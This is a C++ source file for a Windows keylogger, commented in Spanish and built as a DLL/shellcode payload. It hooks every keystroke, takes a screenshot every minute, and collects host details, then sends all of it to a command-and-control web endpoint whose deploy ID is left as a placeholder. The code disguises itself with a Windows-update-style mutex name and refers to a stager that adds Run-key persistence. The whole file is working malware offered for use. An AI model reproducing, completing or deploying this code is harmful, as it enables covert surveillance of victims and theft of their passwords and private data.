// kl.cpp
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <mutex>
#include <cstdio>

#include "c2.h"
#include "screenshot.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")

// ============================================================
//  CONFIGURACIÓN — ¡CAMBIA ESTO!
// ============================================================
static const wchar_t* C2_URL =
    L"https://script.google.com/macros/s/REEMPLAZA_CON_TU_DEPLOY_ID/exec";
// ============================================================

static const wchar_t* MUTEX_NAME = L"Global\\WinUpdateSvc_KL";
static const int REPORT_EVERY_SEC   = 60;   // ← cambiado de 30 a 60
static const int SCREEN_EVERY_SEC   = 60;   // ← cambiado de 30 a 60

// ---------- Estado global ----------
static HHOOK        g_hook = NULL;
static std::wstring g_buffer;
static std::mutex   g_mtx;

// ---------- Utilidades ----------
static std::wstring NowStamp() {
    SYSTEMTIME st; GetLocalTime(&st);
    wchar_t buf[64];
    swprintf_s(buf, L"%04d-%02d-%02d %02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return buf;
}

static std::wstring GetHostname() {
    wchar_t buf[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD sz = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(buf, &sz);
    return buf;
}

static std::string WStringToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int size = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                                   nullptr, 0, nullptr, nullptr);
    std::string out(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                        &out[0], size, nullptr, nullptr);
    return out;
}

static std::wstring HtmlEscapeW(const std::wstring& s) {
    std::wstring o; o.reserve(s.size() + 16);
    for (wchar_t c : s) {
        switch (c) {
            case L'<': o += L"&lt;";  break;
            case L'>': o += L"&gt;";  break;
            case L'&': o += L"&amp;"; break;
            default:   o += c;
        }
    }
    return o;
}

// ---------- Info del sistema ----------
static std::string GetCPUName() {
    HKEY hKey;
    char buf[256] = {0};
    DWORD sz = sizeof(buf);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "ProcessorNameString", 0, 0, (LPBYTE)buf, &sz);
        RegCloseKey(hKey);
    }
    std::string s = buf;
    while (!s.empty() && (s.back() == ' ' || s.back() == '\t')) s.pop_back();
    return s.empty() ? "desconocido" : s;
}

static std::wstring GetOSName() {
    typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNt = GetModuleHandleW(L"ntdll.dll");
    if (hNt) {
        auto RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNt, "RtlGetVersion");
        if (RtlGetVersion) {
            RTL_OSVERSIONINFOW rovi = {0};
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (RtlGetVersion(&rovi) == 0) {
                wchar_t buf[64];
                swprintf_s(buf, L"Windows %lu.%lu.%lu",
                    rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
                return buf;
            }
        }
    }
    return L"Windows";
}

static std::wstring GetArch() {
    SYSTEM_INFO si; GetNativeSystemInfo(&si);
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: return L"AMD64";
        case PROCESSOR_ARCHITECTURE_INTEL: return L"x86";
        case PROCESSOR_ARCHITECTURE_ARM64: return L"ARM64";
        default: return L"desconocida";
    }
}

// ---------- Traducción de teclas ----------
static std::wstring TranslateKey(DWORD vk, bool shift, bool caps) {
    bool upper = shift ^ caps;
    if (vk >= 'A' && vk <= 'Z') {
        wchar_t c = (wchar_t)vk;
        if (!upper) c = (wchar_t)(c + 32);
        return std::wstring(1, c);
    }
    if (vk >= '0' && vk <= '9') {
        const wchar_t* shifted = L")!@#$%^&*(";
        if (shift) return std::wstring(1, shifted[vk - '0']);
        return std::wstring(1, (wchar_t)vk);
    }
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9)
        return std::wstring(1, (wchar_t)(L'0' + (vk - VK_NUMPAD0)));

    switch (vk) {
        case VK_SPACE:    return L" ";
        case VK_RETURN:   return L"[ENTER]";
        case VK_TAB:      return L"[TAB]";
        case VK_BACK:     return L"[BACK]";
        case VK_ESCAPE:   return L"[ESC]";
        case VK_DELETE:   return L"[DEL]";
        case VK_LEFT:     return L"[LEFT]";
        case VK_RIGHT:    return L"[RIGHT]";
        case VK_UP:       return L"[UP]";
        case VK_DOWN:     return L"[DOWN]";
        case VK_HOME:     return L"[HOME]";
        case VK_END:      return L"[END]";
        case VK_PRIOR:    return L"[PGUP]";
        case VK_NEXT:     return L"[PGDN]";
        case VK_INSERT:   return L"[INS]";
        case VK_CAPITAL:  return L"[CAPS]";
        case VK_OEM_1:    return shift ? L":" : L";";
        case VK_OEM_2:    return shift ? L"?" : L"/";
        case VK_OEM_3:    return shift ? L"~" : L"`";
        case VK_OEM_4:    return shift ? L"{" : L"[";
        case VK_OEM_5:    return shift ? L"|" : L"\\";
        case VK_OEM_6:    return shift ? L"}" : L"]";
        case VK_OEM_7:    return shift ? L"\"" : L"'";
        case VK_OEM_PLUS: return shift ? L"+" : L"=";
        case VK_OEM_COMMA:return shift ? L"<" : L",";
        case VK_OEM_MINUS:return shift ? L"_" : L"-";
        case VK_OEM_PERIOD:return shift ? L">" : L".";
    }
    return L"";
}

// ---------- Hook de teclado ----------
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool caps  = (GetKeyState(VK_CAPITAL) & 1) != 0;
            if (kb->vkCode == VK_CAPITAL) caps = !caps;

            std::wstring key = TranslateKey(kb->vkCode, shift, caps);
            if (!key.empty()) {
                std::lock_guard<std::mutex> lk(g_mtx);
                g_buffer += key;
            }
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// ---------- Mensajes al C2 ----------
static void SendStartupMessage() {
    DebugLog("SM: START");

    std::string cpu = GetCPUName();
    std::wstring os = GetOSName();
    std::wstring arc = GetArch();
    std::wstring host = GetHostname();

    wchar_t buf[2048] = {0};
    swprintf_s(buf, 2048,
        L"\U0001F7E2 <b>KEYLOGGER INICIADO</b>\n"
        L"\U0001F550 Hora: %s\n"
        L"\U0001F5A5\uFE0F Host: %s\n"
        L"\u2699\uFE0F Procesador: %hs\n"
        L"\U0001F4BB Sistema: %s\n"
        L"\U0001F9E9 M\u00e1quina: %s\n"
        L"\U0001F4CC Persistencia: HKCU Run",
        NowStamp().c_str(), host.c_str(), cpu.c_str(),
        os.c_str(), arc.c_str());

    std::string payload = WStringToUtf8(buf);
    SendText(C2_URL, payload);
    DebugLog("SM: DONE");
}

static void SendKeyboardReport() {
    std::wstring payload;
    bool hasKeys = false;
    {
        std::lock_guard<std::mutex> lk(g_mtx);
        if (!g_buffer.empty()) {
            payload.swap(g_buffer);
            hasKeys = true;
        }
    }
    if (!hasKeys) payload = L"(sin actividad)";

    std::wstring host = GetHostname();
    int total = hasKeys ? (int)payload.length() : 0;

    std::wstring msg;
    msg += L"\U0001F534 <b>REPORTE DE TECLADO</b>\n";
    msg += L"\U0001F550 Hora: " + NowStamp() + L"\n";
    msg += L"\U0001F5A5\uFE0F Host: " + host + L"\n\n";
    msg += L"\u2328\uFE0F <b>TECLAS EN " +
           std::to_wstring(REPORT_EVERY_SEC) + L" SEGUNDOS:</b>\n";
    msg += L"<pre>" + HtmlEscapeW(payload) + L"</pre>\n\n";
    msg += L"\U0001F4CA <b>Total:</b> " + std::to_wstring(total) + L" caracteres";

    SendText(C2_URL, WStringToUtf8(msg));
}

static void SendScreenshot() {
    std::vector<BYTE> jpg;
    if (!CaptureScreenshotJpeg(jpg, 50)) return;
    if (jpg.empty()) return;

    std::wstring host = GetHostname();
    std::wstring caption;
    caption  = L"\U0001F4F8 <b>CAPTURA DE PANTALLA</b>\n";
    caption += L"\U0001F550 " + NowStamp() + L"\n";
    caption += L"\U0001F5A5\uFE0F " + host;

    SendPhoto(C2_URL, jpg, WStringToUtf8(caption));
}

// ---------- Loops ----------
static void ReportLoop() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(REPORT_EVERY_SEC));
        SendKeyboardReport();
    }
}

static void ScreenshotLoop() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(SCREEN_EVERY_SEC));
        SendScreenshot();
    }
}

// ---------- Worker ----------
static DWORD WINAPI StartupSender(LPVOID) {
    SendStartupMessage();
    return 0;
}

static DWORD WINAPI Worker(LPVOID) {
    DebugLog("=== Worker START ===");
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        DebugLog("Mutex ya existe, saliendo");
        return 0;
    }
    DebugLog("Mutex OK");

    // Persistencia DESHABILITADA en el shellcode (la hace el stager)
    DebugLog("PersistenceThread deshabilitado (lo hace el stager)");

    CreateThread(NULL, 0, StartupSender, NULL, 0, NULL);
    DebugLog("StartupSender lanzado");

    std::thread(ReportLoop).detach();
    std::thread(ScreenshotLoop).detach();
    DebugLog("Threads OK");

    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                GetModuleHandleW(NULL), 0);
    if (!g_hook) {
        char buf[64];
        sprintf_s(buf, "SetWindowsHookExW FALLO err=%lu", GetLastError());
        DebugLog(buf);
    } else {
        DebugLog("Hook OK");
    }

    // CRÍTICO: el message loop mantiene el hilo vivo Y procesando mensajes.
    // Sin esto, el callback del hook (LowLevelKeyboardProc) nunca se ejecuta
    // y las teclas no se capturan.
    DebugLog("Worker: entrando en message loop");
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    DebugLog("=== Worker EXIT ===");
    return 0;
}

// ---------- Entry points ----------
extern "C" __declspec(dllexport) void Go() {
    DebugLog("Go: entry");
    Worker(NULL);
}

BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(GetModuleHandleW(NULL));
        CreateThread(NULL, 0, Worker, NULL, 0, NULL);
    }
    return TRUE;
}